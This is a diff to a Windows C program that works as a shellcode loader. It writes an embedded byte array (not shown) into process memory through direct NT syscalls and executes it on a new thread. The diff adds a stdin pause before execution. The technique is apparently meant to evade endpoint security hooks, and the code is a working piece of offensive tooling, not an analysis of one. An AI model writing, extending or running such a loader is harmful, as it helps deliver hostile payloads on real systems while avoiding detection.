@@ -1,5 +1,6 @@
 
 #include <windows.h>
+#include <stdio.h>
 #include "syscalls.h"
 
 unsigned char code[] =
@@ -27,6 +28,10 @@ int main() {
     // Copy shellcode into allocated memory
     NtWriteVirtualMemory(GetCurrentProcess(), allocation_start, code, sizeof(code), 0);
 
+	char input[1024];
+
+	fgets(input, sizeof(input), stdin);
+
 
     // Execute shellcode in memory 
     NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), allocation_start, allocation_start, FALSE, NULL, NULL, NULL, NULL);
@@ -35,6 +40,9 @@ int main() {
     // Wait for the end of the thread and close the handle
     NtWaitForSingleObject(hThread, FALSE, NULL);
     NtClose(hThread);
+
+
+
 
     return 0;
 }
